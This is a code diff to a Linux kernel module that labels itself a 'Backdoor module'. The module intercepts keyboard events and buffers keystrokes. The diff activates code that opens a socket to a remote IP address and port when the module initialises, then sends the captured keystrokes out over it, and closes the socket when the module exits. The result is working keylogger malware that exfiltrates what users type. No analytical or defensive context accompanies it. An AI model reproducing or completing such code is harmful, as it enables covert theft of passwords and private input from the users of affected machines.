@@ -32,19 +32,7 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         printk(KERN_INFO "Buffer size: %d\n", buffer_count);
 
         if (buffer_count == 0) {
-            //struct socket* sock = create_socket(IP_ADDRESS, PORT);
-            printk(KERN_INFO "Created socket\n");
-            //if (sock == NULL) {
-             //   printk(KERN_INFO "Oh no, no connection\n");
-               // return IRQ_NONE;
-            //}
-
-            //send_message(sock, keystrokes);
-            //printk(KERN_INFO "Sent message\n");
-            //msleep(10000);
-            //shutdown_socket(sock);
-            //printk(KERN_INFO "Closed socket\n");
-            //msleep(10000);
+            send_message(keystrokes);
         }
     }
 
@@ -74,6 +62,12 @@ static int __init keyboard_module_init(void) {
         return result;
     }
 
+    result = create_socket(IP_ADDRESS, PORT);
+    if (result < 0) {
+        printk(KERN_ERR "Failed to connect\n");
+        return result;
+    }
+
     printk(KERN_INFO "Backdoor module initialized\n");
     return 0;
 }
@@ -81,7 +75,7 @@ static int __init keyboard_module_init(void) {
 static void __exit keyboard_module_exit(void) {
     // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_notifier_block);
-
+    shutdown_socket();
     printk(KERN_INFO "Backdoor module exited\n");
 }
 
